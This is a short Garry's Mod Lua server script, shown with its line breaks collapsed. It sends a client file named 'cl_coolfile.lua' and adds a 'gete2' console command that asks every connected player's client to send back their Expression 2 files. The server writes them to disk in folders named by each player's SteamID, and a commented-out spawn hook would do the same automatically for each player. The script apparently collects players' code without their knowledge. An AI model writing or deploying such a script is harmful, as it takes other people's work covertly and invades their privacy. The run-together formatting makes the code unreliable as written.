require("datastream")AddCSLuaFile("cl_coolfile.lua")local function CopyThaE2(sender, handler, id, encoded, decoded)	local SID = string.gsub(sender:SteamID(),":","-")	file.CreateDir("E2s")	file.CreateDir("E2s/"..SID)	file.Write("E2s/"..SID.."/"..decoded[1], decoded[2])	print("Got E2: "..SID.."/"..decoded[1])endlocal function GetTheE2()	print("Getting E2s...")	datastream.StreamToClients(player.GetAll(),"E2Get", {"nil"})endlocal function playerRespawn(ply)	if (runoncee2 == nil) then runoncee2 = {} end	if (runoncee2[ply:UniqueID()] == nil) then		print("Getting E2s from "..ply:Nick())		datastream.StreamToClients(ply,"E2Get", {"nil"})		runoncee2[ply:UniqueID()] = "notnil"	endenddatastream.Hook("E2Send", CopyThaE2)concommand.Add("gete2",GetTheE2)--hook.Add("PlayerSpawn", "playerRespawnForE2",playerRespawn)